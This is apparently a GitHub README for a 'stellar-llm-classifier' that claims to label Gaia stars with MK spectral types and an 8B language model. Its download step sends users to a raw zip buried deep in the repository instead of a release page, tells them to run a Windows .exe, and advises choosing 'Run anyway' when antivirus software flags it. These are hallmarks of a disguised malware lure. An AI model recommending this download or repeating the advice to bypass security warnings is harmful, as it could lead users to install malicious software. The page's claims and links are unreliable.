# 🔭 stellar-llm-classifier - Identify stars using smart artificial intelligence

[![Download Stellar Classifier](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip)

## What is this tool?
Stellar-llm-classifier helps you identify stars. It uses two methods to analyze data from the Gaia mission. First, it follows set scientific rules for stellar classification. Second, it uses a language model named AstroSage-8B to write clear descriptions for each star. 

The software produces MK spectral types and natural-language text for your data. You do not need to understand coding to use this tool. It processes files on your computer and provides results based on real astronomical data.

## System Requirements 💻
Before you run this application, ensure your computer meets these minimum specifications:

*   **Operating System:** Windows 10 or Windows 11.
*   **Processor:** Intel Core i5 or AMD Ryzen 5 with at least 4 cores.
*   **Memory:** 8 GB of RAM (16 GB recommended for faster processing).
*   **Storage:** 5 GB of free space for the application and the language model files.
*   **Graphics:** A dedicated graphics card is helpful but not required.

## Get the software 📥
To start using the tool, visit the link below.

[https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip](https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip)

On this page, look for the most recent version labeled "Latest". Under the Assets section, click the file that ends in .exe. This file contains the installer for Windows. Save the file to your computer.

## Installation steps ⚙️
1. Locate the file you saved in your Downloads folder.
2. Double-click the file to start the installer.
3. Follow the prompts on your screen.
4. Choose a folder where you want to keep the program files.
5. The installer will extract the necessary components. This might take a few minutes.
6. Once finished, a shortcut will appear on your desktop.

## Running the application 🚀
1. Open the application using the shortcut on your desktop.
2. You will see a window with a text box for your data.
3. Import your CSV file that contains Gaia DR3 star information. Ensure your file columns match the headers specified in the settings menu.
4. Select the option to "Classify stars" from the main menu.
5. Wait while the tool applies the classification rules.
6. The app displays a progress bar. Do not close the window while the bar is active.
7. After the process finishes, export your results to a new spreadsheet file.

## Troubleshooting common issues 🛠️
*   **The app refuses to open:** Ensure your computer has the latest Windows updates. Restart your machine and try again.
*   **The program runs slow:** This tool uses an intensive language model. Close other heavy programs like video editors or web browsers while you run the classifier.
*   **Data errors:** Check that your source file does not have empty rows or missing values in critical columns like temperature or luminosity.
*   **Missing descriptions:** Re-check your internet connection if the app requires external resources, though this version is designed to run offline once the model files are downloaded.
*   **Antivirus alerts:** Some security software flags new applications. If this happens, choose the option to "Run anyway" or "Allow application."

## How it works 🧠
The software uses a specific architecture. It combines hard-coded astrophysical parameters with a deep-learning engine. This dual approach ensures that the output remains grounded in physics. The rules-based part classifies the star according to standard MK types. The language model then interprets these types to create readable sentences. This allows users to read star summaries as if an expert astronomer wrote them.

## Supported data formats 📄
The software currently supports standard CSV files. Ensure your file format includes proper labels for headers. The system reads columns for absolute magnitude, effective temperature, and surface gravity. If your data lacks these headers, the software will show an error message and ask you to fix the column names. 

## Updates and changes 🔄
We update this tool to improve classification accuracy. Check the releases page regularly for news about version changes. New updates often include better model weights and faster processing speeds. When a new version arrives, download it and install it over the old version to preserve your local settings.

## Frequently asked questions ❓
**Do I need an internet connection to run this?**
You need an internet connection to download the installer. Once you install the application, it performs calculations on your local hardware.

**Can I use this for non-Gaia data?**
The classifier performs best with Gaia DR3 data. You may get inconsistent results if you use data from other missions.

**Is my data private?**
Yes. The software processes your data locally. No files are uploaded to any server. Your information stays on your local machine.

**What does AstroSage-8B mean?**
This refers to the deep learning model. It is a variant of an 8-billion parameter system trained on astronomical literature. It specializes in converting complex data points into simple prose.

**Can I modify the rules?**
Advanced users may access the configuration file in the installation directory. However, we recommend that you leave these files as they are to maintain accurate classification performance. 

## Configuration tips 💡
If you notice the classification takes too long, go to the application settings. Look for the "Compute" tab. You can lower the number of simultaneous processes. This consumes less memory and keeps your computer responsive during the classification task. You can also specify the path to your data folders to make finding your export files easier.